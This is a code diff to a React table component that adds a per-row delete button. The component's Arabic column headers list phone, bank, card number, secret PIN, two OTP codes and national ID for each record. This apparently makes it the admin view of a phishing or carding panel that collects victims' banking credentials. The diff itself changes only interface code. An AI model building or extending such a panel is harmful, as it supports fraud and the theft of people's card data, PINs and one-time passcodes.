@@ -1,5 +1,5 @@
 import { useState } from "react";
-import { AlertCircle, ChevronLeft, ChevronRight } from "lucide-react";
+import { AlertCircle, ChevronLeft, ChevronRight, Trash2 } from "lucide-react";
 
 const PAGE_SIZE = 20;
 
@@ -30,9 +30,9 @@ const TypeBadge = ({ type }) => {
   );
 };
 
-const HEADERS = ["التاريخ/الوقت", "الهاتف", "النوع", "الصفحة", "المبلغ", "البنك", "البطاقة", "الرقم السري", "OTP1", "OTP2", "رقم الهوية", "الشبكة", "الخطوة", "الدفع لـ"];
+const HEADERS = ["التاريخ/الوقت", "الهاتف", "النوع", "الصفحة", "المبلغ", "البنك", "البطاقة", "الرقم السري", "OTP1", "OTP2", "رقم الهوية", "الشبكة", "الخطوة", "الدفع لـ", ""];
 
-export default function RecordsTable({ records, loading, onSelect }) {
+export default function RecordsTable({ records, loading, onSelect, onDelete }) {
   const [page, setPage] = useState(1);
   const totalPages = Math.max(1, Math.ceil(records.length / PAGE_SIZE));
   const paginated = records.slice((page - 1) * PAGE_SIZE, page * PAGE_SIZE);
@@ -123,6 +123,14 @@ export default function RecordsTable({ records, loading, onSelect }) {
                   ) : "—"}
                 </td>
                 <td className="px-3 py-2.5 text-slate-300 whitespace-nowrap">{r.pay_for || "—"}</td>
+                <td className="px-3 py-2.5" onClick={e => e.stopPropagation()}>
+                  <button
+                    onClick={() => onDelete(r.id)}
+                    className="p-1.5 rounded-lg text-slate-600 hover:text-red-400 hover:bg-red-500/10 transition-colors"
+                  >
+                    <Trash2 className="h-3.5 w-3.5" />
+                  </button>
+                </td>
               </tr>
             ))}
           </tbody>
